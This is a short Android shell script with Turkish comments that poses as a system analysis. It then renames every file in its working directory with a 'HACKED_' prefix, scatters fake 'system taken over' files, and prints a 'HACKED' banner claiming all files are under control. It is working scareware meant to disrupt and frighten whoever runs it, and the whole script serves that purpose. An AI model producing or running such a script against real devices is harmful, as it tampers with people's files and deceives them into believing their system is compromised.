#!/system/bin/sh

echo "------------------------------------------"
echo "   SISTEM ANALIZ EDILIYOR... [WAIT]"
echo "------------------------------------------"
sleep 2

# 1. Dosya isimlerini degistirme (Hacked ekleme)
for file in *; do
    if [ "$file" != "hacklendi.sh" ]; then
        mv "$file" "HACKED_$file" 2>/dev/null
    fi
done

# 2. Galeri/Gorsel taklidi yapma (Bos dosyalar olusturur)
# Gercek Galeri APK'sini kopyalamak sistemi kasar, 
# onun yerine sahte 'galeri' dosyalari saciyoruz.
for i in 1 2 3 4 5; do
    echo "Sistem ele gecirildi." > "GALERI_HACKED_$i.txt"
done

# 3. Final Mesaji
clear
echo "##########################################"
echo "#                                        #"
echo "#        !!! HACKLANDI !!!               #"
echo "#                                        #"
echo "##########################################"
echo "Tum dosyalariniz kontrol altinda."
